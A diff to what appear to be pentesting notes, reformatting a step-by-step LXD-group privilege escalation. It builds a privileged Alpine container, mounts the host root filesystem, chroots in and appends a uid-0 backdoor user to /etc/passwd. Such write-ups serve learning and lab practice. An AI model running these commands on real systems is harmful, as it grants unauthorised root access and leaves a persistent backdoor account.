@@ -94,27 +94,33 @@
   `cat /etc/passwd | grep "lxd"`
 
 - Build a container on your machine with this commands,run it as root though
-  `git clone https://github.com/saghul/lxd-alpine-builder.git
-   cd lxd-alpine-builder
-   ./build-alpine`
+
+      git clone https://github.com/saghul/lxd-alpine-builder.git
+      cd lxd-alpine-builder
+      ./build-alpine
  
 -  Receive it on your target machine with pyhton,test directories like `/dev/shm` or`/tmp`,receive the file on your target machine
  with python http.server.Send the one with a recent date
 
 - Initiate the image
-  `lxc init alpine juggernaut -c security.privileged=true
-   lxc config device add juggernaut gimmeroot disk source=/ path=/mnt/root recursive=true
-   lxc start juggernaut
-   lxc list`
+
+       lxc init alpine juggernaut -c security.privileged=true
+       lxc config device add juggernaut gimmeroot disk source=/ path=/mnt/root recursive=true
+       lxc start juggernaut
+       lxc list
 
 - Execute as root
-   `lxc exec juggernaut sh`
+
+      lxc exec juggernaut sh
+  
 - If you cannot find storage devices,you have to create one,use brtfs and if the server does not support ipv6,set it to none
-  `lxd init`
+
+      lxd init
+
 - After executing,breakout with `chroot /mnt/root`
 
 - Creating a new user can help us escalate privileges,on your system,do `openssl passwd {choice of password}` and in your target machine do this
 
-  `echo '[usernameyou want]:[openssl generated hash]:0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd`  
+      echo '[usernameyou want]:[openssl generated hash]:0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd` 
   
   
